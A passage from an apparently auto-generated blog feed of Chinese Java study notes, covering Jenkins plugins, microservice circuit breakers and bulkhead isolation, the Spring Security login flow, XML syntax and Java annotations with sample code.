错误跟踪很容易。</li><li>提供大量的插件支持。</li><li>对代码的迭代改进。</li><li>构建失败会在集成阶段进行缓存。</li><li>对于每个代码提交更改, 都会生成一个自动生成报告通知。</li><li>为了将构建报告的成功或失败通知开发人员, 它与LDAP邮件服务器集成在一起。</li><li>实现持续集成的敏捷开发和测试驱动的开发。</li><li>通过简单的步骤, 即可自动完成maven发布项目</li></ul></li></ul></li></ul><ul><li>Jenkins主要整合了两个组成部分?<ul><li>Jenkins与以下两个组件集成在一起：<ul><li>GIT, SVN等版本控制系统</li><li>并构建诸如Apache Maven之类的工具。</li></ul></li></ul></li></ul><ul><li>Jenkins中一些由用的插件?<ul><li>Maven 2 project</li><li>Amazon EC2</li><li>HTML publisher</li><li>Copy artifact</li><li>Join</li><li>Green Balls</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java基础知识&quot;&gt;&lt;a href=&quot;#Java基础知识&quot; class=&quot;headerlink&quot; title=&quot;Java基础知识&quot;&gt;&lt;/a&gt;Java基础知识&lt;/h1&gt;&lt;h1 id=&quot;gt-Java概述&quot;&gt;&lt;a href=&quot;#gt-Java概述&quot; class=&quot;he</summary>
      
    
    
    
    <category term="Java基础" scheme="http://zephyr-cyber.github.io/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    <category term="Java基础" scheme="http://zephyr-cyber.github.io/categories/Java%E5%9F%BA%E7%A1%80/Java%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="Java基础" scheme="http://zephyr-cyber.github.io/tags/Java%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>微服务保护</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/992547580.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/992547580.html</id>
    <published>2023-01-02T03:05:25.000Z</published>
    <updated>2023-01-05T05:03:04.114Z</updated>
    
    <content type="html"><![CDATA[<h1 id="服务降级"><a href="#服务降级" class="headerlink" title="服务降级"></a>服务降级</h1><h2 id="1、什么是服务降级"><a href="#1、什么是服务降级" class="headerlink" title="1、什么是服务降级"></a>1、什么是服务降级</h2><blockquote><p>当使用feign进行远程调用的时候，如果被调用的服务不可用，这时候feign就会调用自己的接口方法</p><p>这个调用者自己的方法就是服务降级方法</p></blockquote><h2 id="2、服务降级的实现方案"><a href="#2、服务降级的实现方案" class="headerlink" title="2、服务降级的实现方案"></a>2、服务降级的实现方案</h2><blockquote><ol><li>直接使用feign接口   实现相对简单，不能拿到被调用方的异常信息</li><li>实现FallbackFacctory的接口（推荐使用） 实现相对麻烦，但是可以拿到被调用方的异常信息</li></ol></blockquote><h1 id="熔断器"><a href="#熔断器" class="headerlink" title="熔断器"></a>熔断器</h1><h2 id="1、作用"><a href="#1、作用" class="headerlink" title="1、作用"></a>1、作用</h2><blockquote><p>​        熔断器是一个框架</p><p>​        我们可以通过配置来配置熔断器的参数</p><ol><li><p>触发熔断器的条件（时间间隔/失败次数/失败比列）</p></li><li><p>熔断器的持续时长（熔断时长）</p><p>​    使用熔断器可以保护微服务在某一个/多个微服务不可用的情况下避免雪崩效应</p></li></ol></blockquote><h2 id="2、三种状态"><a href="#2、三种状态" class="headerlink" title="2、三种状态"></a>2、三种状态</h2><blockquote><ol><li><p>开启 </p><p>​    熔断器生效，被熔断的服务禁止一切访问</p></li><li><p>半开</p><p>​    在微服务熔断时长到达配置的时长</p><p>​    被焙断的微服务会允许小流量的请求访问如果这些请求是可以正常响应的 </p><p>​    熔断器就会变成关闭状态如果这些请求是可以响应异常的 </p><p>​    熔断器就会再次变成开启状态</p></li><li><p>关闭</p><p>​    焙断器不生效</p></li><li><p>三种状态的切换</p></li></ol></blockquote><h1 id="舱壁模式"><a href="#舱壁模式" class="headerlink" title="舱壁模式"></a>舱壁模式</h1><h2 id="1、作用-1"><a href="#1、作用-1" class="headerlink" title="1、作用"></a>1、作用</h2><blockquote><p>把一个微服务的资源按照接口调用分成若干份</p><p>当某一个接口调用失败的时候只会耗尽自己的那一份咨源</p><p>不会影响到其他接口的资源</p></blockquote><h2 id="2、线程池隔离"><a href="#2、线程池隔离" class="headerlink" title="2、线程池隔离"></a>2、线程池隔离</h2><p>给每个远程调用接口创建一个线程池</p><p>当这个接口对应的线程池中的线程耗尽就不再给这个接口发起远程调用</p><p>正常情况下:使用完的线程会返回给线程池</p><p>如果被调用的微服务不可用有可能会导致线程无法归还</p><h2 id="3、信号量隔离"><a href="#3、信号量隔离" class="headerlink" title="3、信号量隔离"></a>3、信号量隔离</h2><p>使用计数器统计每个接口的调用次数当达到指定次数后这个接口就不会被再次调用</p><p>如果被调用服务器不可用没有响应回来则计数器不会减1直到指定的次数耗尽</p><p>正常情况下:如果被调用服务器返回则计数器减1</p><h1 id="SpringSecurity执行流程"><a href="#SpringSecurity执行流程" class="headerlink" title="SpringSecurity执行流程"></a>SpringSecurity执行流程</h1><blockquote><ol><li>用户输入用户名和密码提交给后台</li><li>后台程序中如果整合了SpringSecurity，这个登录请求会被Security框架进行拦截</li><li>Security框架中的UsernamePasswordAuthenticationFilter这个过滤器会接收到用户名和密码并封装成一个Authentication</li><li>UsernamePasswordAuthenticationFilter会将封装好的Authentication传递给AuthenticationManager</li><li>AuthenticationManager将Authentication传递给DaoAuthenticationProvider</li><li>DaoAuthenticationProvider要调用UserDeatilsService获取数据库中或者内存中的用户名和密码</li><li>在DaoAuthenticationProvider中进行用户名和密码的校验</li><li>如果校验通过后Authentication中填充信息并返回给UsernamePasswordAuthenticationFilter</li><li>UsernamePasswordAuthenticationFilter会判断Authentication对象是否为空，如果为空说明用户输入的用户名和密码是错误的，直接相应给客户端错误信息，如果不为空说明用户输入的用户名和密码是正确的，然后把这个信息保存到Security的上下文中，方便在项目中获取使用。</li></ol></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;服务降级&quot;&gt;&lt;a href=&quot;#服务降级&quot; class=&quot;headerlink&quot; title=&quot;服务降级&quot;&gt;&lt;/a&gt;服务降级&lt;/h1&gt;&lt;h2 id=&quot;1、什么是服务降级&quot;&gt;&lt;a href=&quot;#1、什么是服务降级&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="Java" scheme="http://zephyr-cyber.github.io/categories/Java/"/>
    
    <category term="微服务保护" scheme="http://zephyr-cyber.github.io/categories/Java/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E4%BF%9D%E6%8A%A4/"/>
    
    
    <category term="Java" scheme="http://zephyr-cyber.github.io/tags/Java/"/>
    
    <category term="微服务保护" scheme="http://zephyr-cyber.github.io/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E4%BF%9D%E6%8A%A4/"/>
    
  </entry>
  
  <entry>
    <title>Java-基础-XML&amp;注解&amp;Junit</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/3199816283.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/3199816283.html</id>
    <published>2022-12-24T11:53:46.000Z</published>
    <updated>2022-12-15T03:28:13.806Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-XML"><a href="#1-XML" class="headerlink" title="1. XML"></a>1. XML</h2><h3 id="1-1-XML和properties对比"><a href="#1-1-XML和properties对比" class="headerlink" title="1.1 XML和properties对比"></a>1.1 <code>XML</code>和<code>properties</code>对比</h3><p><code>.properties</code>作为配置文件的弊端</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">className</span>=<span class="string">com.itheima.Student,com.itheima.Teacher</span></span><br><span class="line"><span class="attr">methodName</span>=<span class="string">study,teach</span></span><br></pre></td></tr></table></figure><p><code>xml</code>可以克服</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xxx</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">yyy</span> <span class="attr">id</span>=<span class="string">&quot;123&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">className</span>&gt;</span>com.itheima.Student<span class="tag">&lt;/<span class="name">className</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>study<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">yyy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">yyy</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">className</span>&gt;</span>com.itheima.Teacher<span class="tag">&lt;/<span class="name">className</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>teach<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">yyy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xxx</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意</p><ul><li><code>properties</code>配置文件的弊端，多个相同类型的内容配置在一起混乱，且不好解析</li><li><code>xml</code>配置文件可以避免配置混乱的问题，提高可阅读性</li><li><code>xml</code>不是我们配置文件的最终选择，项目开始之后选（yml、properties）</li></ul><h3 id="1-2-概念"><a href="#1-2-概念" class="headerlink" title="1.2 概念"></a>1.2 概念</h3><ol><li> <code>XML</code>概念 </li><li>XML（Extensible Markup Language)，可扩展的标记语言<br><code>标记语言</code>：通过标签来描述数据的一门语言（标签有时我们也将其称之为元素/标记）<br>可扩展：标签的名字是可以自定义的<br>一句话：<strong>XML可以使用多个标签封装参数，而标签名是可以自定义的。</strong></li><li> <code>XML</code>作用 </li></ol><ul><li>用于进行存储数据和传输数据</li><li>作为软件的配置文件</li></ul><ol start="3"><li> 万维网联盟（W3c）<br>参与制定了很多互联网相关的规范 </li></ol><h3 id="1-3-作用"><a href="#1-3-作用" class="headerlink" title="1.3 作用"></a>1.3 作用</h3><ul><li> <code>XML</code>可以作为配置文件，<code>web</code>核心的<code>web.xml</code>，框架（SSM）；之后使用<code>yml</code>+注解 </li><li> <code>XML</code>可以作为前后台数据交换的载体（已经过时了，推荐是<code>json</code>） </li><li> <code>XML</code>可以存储数据（不用，不好解析） </li></ul><h3 id="1-4-标签规则"><a href="#1-4-标签规则" class="headerlink" title="1.4 标签规则"></a>1.4 标签规则</h3><ul><li> 标签有一对尖括号和合法的标识符组成：<code>&lt;student&gt;</code> </li><li> 标签必须成对出现或者<strong>自闭合</strong>：<code>&lt;student&gt;&lt;/student&gt;或者&lt;student /&gt;</code> </li><li> 标签可以定义属性，属性和标签名之间、属性和属性之间使用空格分开；属性值必须使用引号(单双引号都可)包裹：<br><code>&lt;student id=&quot;1” age=&quot;23&quot;/&gt;</code> </li><li> 标签需要正确嵌套：先开后闭：<code>&lt;student&gt;&lt;name&gt;张三&lt;/name&gt;&lt;/student&gt;</code> </li></ul><blockquote><p>案例练习</p></blockquote><ol><li> Student标签下，配置姓名name、age、gender三个子标签，并指定值 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 根标签的开始标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">students</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">student</span> <span class="attr">id</span>=<span class="string">&quot;001&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 开始标签和结束标签之间称为标签体内容</span></span><br><span class="line"><span class="comment">            内容可以是简单文本，也可以是其他标签（子标签）</span></span><br><span class="line"><span class="comment">         --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>张三丰<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">age</span>&gt;</span>99<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">gender</span>&gt;</span>男<span class="tag">&lt;/<span class="name">gender</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 根标签的结束标签 --&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">student</span> <span class="attr">id</span>=<span class="string">&quot;002&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 开始标签和结束标签之间称为标签体内容</span></span><br><span class="line"><span class="comment">            内容可以是简单文本，也可以是其他标签（子标签）</span></span><br><span class="line"><span class="comment">         --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>张三丰1<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">age</span>&gt;</span>998<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">gender</span>&gt;</span>男<span class="tag">&lt;/<span class="name">gender</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 根标签的结束标签 --&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">students</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    注意：</span></span><br><span class="line"><span class="comment">        标签嵌套时，一定要正确嵌套：遵循的原则是先开后闭</span></span><br><span class="line"><span class="comment"> --&gt;</span></span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li>Teacher标签下，配置姓名name、身份height、体重weight、工资salary四个子标签，并指定值<br>Teacher标签有属性：部们（dept），工龄（seniority）两个属性 </li></ol><h3 id="1-5-语法规则"><a href="#1-5-语法规则" class="headerlink" title="1.5 语法规则"></a>1.5 语法规则</h3><ul><li> 文件后缀为<code>.xml</code> </li><li> 文档声明必须放在第一行第一列，内容固定 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><ul><li> <code>XML</code>有且只能有一个根标签 </li><li> <code>XML</code>文件可以使用注释，格式： <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 注释内容，可以多行  --&gt;</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p> <code>XML</code>文件中左右尖括号有特殊含义，想要表示其本身，需要使用特殊写法  </p><table><thead><tr><th>符号</th><th>书写方式</th><th>备注</th></tr></thead><tbody><tr><td><code>&lt;</code></td><td><code>&amp;lt;</code></td><td>小于符号</td></tr><tr><td><code>&gt;</code></td><td><code>&amp;gt;</code></td><td>大于符号</td></tr><tr><td><code>&quot;</code></td><td><code>&amp;quot;</code></td><td>双引号</td></tr><tr><td><code>&#39;</code></td><td><code>&amp;apos;</code></td><td>单引号</td></tr><tr><td><code>&amp;</code></td><td><code>&amp;amp;</code></td><td>与符号</td></tr></tbody></table></li><li><p> <code>XML</code>文件中可以存在CDATA区，该区中内容不会被XML解析，会被当做普通文本。格式： </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;![CDATA[这里的内容会被当做普通的字符串解析，比方说&lt; &gt; &amp; &#x27; &quot;]]&gt;</span><br></pre></td></tr></table></figure></li></ul><ul><li> 代码<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    课堂练习：</span></span><br><span class="line"><span class="comment">        编写一个xml，配置如下内容</span></span><br><span class="line"><span class="comment">        1. 包含两个老师，标签为&lt;teachers&gt;&lt;/teacher&gt;</span></span><br><span class="line"><span class="comment">        2. 每个老师包含姓名name、班级所在教室classroom、老师的个人信息描述 desc</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 根标签只能出现一次 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">persons</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">person</span> <span class="attr">id</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">age</span>&gt;</span>23<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">info</span>&gt;</span>&lt;![CDATA[这里的内容会被当做普通的字符串解析，比方说&lt; &gt; &amp; &#x27; &quot;]]&gt;<span class="tag">&lt;/<span class="name">info</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">person</span> <span class="attr">id</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">age</span>&gt;</span>23<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">persons</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>验证书写是否成功的方式</p><ol><li><code>idea</code>是否报错</li><li>用浏览器打开看是否能正确展示</li></ol><h2 id="2-注解"><a href="#2-注解" class="headerlink" title="2. 注解"></a>2. 注解</h2><h3 id="2-1-注解-amp-注释-amp-配置"><a href="#2-1-注解-amp-注释-amp-配置" class="headerlink" title="2.1 注解 &amp; 注释 &amp; 配置"></a>2.1 注解 &amp; 注释 &amp; 配置</h3><p>注释：对程序解释说明的文字，给程序员看的</p><p>注解：可以作为配置的一种，可作为一种标志、校验等等。给编译器/程序看的。</p><p>配置方式：</p><p>XML：（配置文件）可以作为配置文件，不好用。其他配置文件有properties、yaml等</p><p>注解：同样可以配置，更简单清爽，框架基本上都是可以通过注解实现配置。</p><h3 id="2-2-注解概念"><a href="#2-2-注解概念" class="headerlink" title="2.2 注解概念"></a>2.2 注解概念</h3><p>注解：可以理解成一个标志/标签，我们可以根据是否有该标志通过反射做区别处理</p><p>格式：@注解名称</p><h3 id="2-3-注解的优势"><a href="#2-3-注解的优势" class="headerlink" title="2.3 注解的优势"></a>2.3 注解的优势</h3><p>作为配置，注解比<code>xml</code>文件简单很多；</p><p>这两种配置方式，我们在之后的框架学习过程中都会用到，并且最终会选择更简单的注解。</p><h3 id="2-4-之前已经学习的注解"><a href="#2-4-之前已经学习的注解" class="headerlink" title="2.4 之前已经学习的注解"></a>2.4 之前已经学习的注解</h3><ul><li><p> 相关注解  </p><table><thead><tr><th>注解</th><th>标注位置(<a href="/Target">@Target) </a> )</th><th>作用</th></tr></thead><tbody><tr><td><a href="/Override">@Override </a></td><td>方法上<code>METHOD</code></td><td>重写</td></tr><tr><td><a href="/FunctionalInterface">@FunctionalInterface </a></td><td>类上<code>TYPE</code></td><td>函数式接口</td></tr><tr><td><a href="/Deprecated">@Deprecated </a></td><td>CONSTRUCTOR, FIELD, LOCAL_VARIABLE, METHOD, PACKAGE, PARAMETER, TYPE</td><td>声明已过时</td></tr><tr><td><a href="/SuppressWarnings">@SuppressWarnings </a></td><td>TYPE, FIELD, METHOD, PARAMETER, CONSTRUCTOR, LOCAL_VARIABLE</td><td>压制警告</td></tr></tbody></table></li><li><p> 代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 已经学习过的注解展示</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Vsunks.v</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Blog</span> blog.sunxiaowei.net/996.mba</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 已经学习过的注解展示</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnoDemo01</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        @Override 就是最常用的一个注解</span></span><br><span class="line"><span class="comment">            告诉编译器，被标注的方法是在重写父类的方法，并检查是否符合重写语法的要求</span></span><br><span class="line"><span class="comment">        任何注解，本身只能作为一个标签；标注某个注解后，并不会产生什么神奇的效果</span></span><br><span class="line"><span class="comment">            只有配合反射，才能实现某些效果</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testLambda</span><span class="params">(Animal a)</span> </span>&#123;</span><br><span class="line">        a.eat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 被标注的方法等内容，已经过时，不推荐使用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Deprecated</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我正在定义一个已经过时的show方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 把标注元素上的警告压制</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是一个从没有被调用过的test方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// lambda能简化特性条件的匿名内部类对象的属性：其中的抽象方法有且只有一个的接口</span></span><br><span class="line">        testLambda(() -&gt; System.out.println(<span class="string">&quot;xxx&quot;</span>));</span><br><span class="line">        <span class="keyword">new</span> AnnoDemo01().show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@FunctionalInterface</span> 该注解标注在某个接口上，用于检查被标注的接口是否是函数式接口</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 函数式接口：接口中的抽象方法有且只有一个，这种接口被称为函数是接口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">eat2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-5-自定义注解"><a href="#2-5-自定义注解" class="headerlink" title="2.5 自定义注解"></a>2.5 自定义注解</h3><p>定义注解之后，解析了才会产生效果。</p><h4 id="2-5-1-定义"><a href="#2-5-1-定义" class="headerlink" title="2.5.1 定义"></a>2.5.1 定义</h4><p>定义</p><ul><li> 通过<code>@interfaece</code>定义一个注解 </li><li> 注解中只有属性，没有方法 </li><li> 属性的数据类型可以是：基本类型、<strong>String</strong>、<strong>Class</strong>、注解、枚举、及上述类型的一维数组 </li><li> 属性访问权限默认只能是<code>public</code>，可以省略不写 </li><li> 属性需要有小括号，类似于类中的成员方法 </li><li> 属性可以通过default指定默认值 </li></ul><h4 id="2-5-2-使用"><a href="#2-5-2-使用" class="headerlink" title="2.5.2 使用"></a>2.5.2 使用</h4><p>把注解标注在类、方法、变量、构造方法、方法形参等位置，就是在使用。</p><ul><li>在使用注解时，注解的所有属性必须要有值（默认或者使用时手动赋值）</li><li>使用时为属性赋值的格式为<code>@注解名称(属性名1=属性值1,名2=值2,名3=&#123;值31,值32&#125;)</code></li></ul><p>使用：仅仅是打了一个标记，并不会有什么神奇的效果。</p><ul><li> 想要有效果，就要配合反射，自己写产生想要的效果的代码 </li><li> 演示代码<br>自定义注解<code>Anno2.java</code> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> 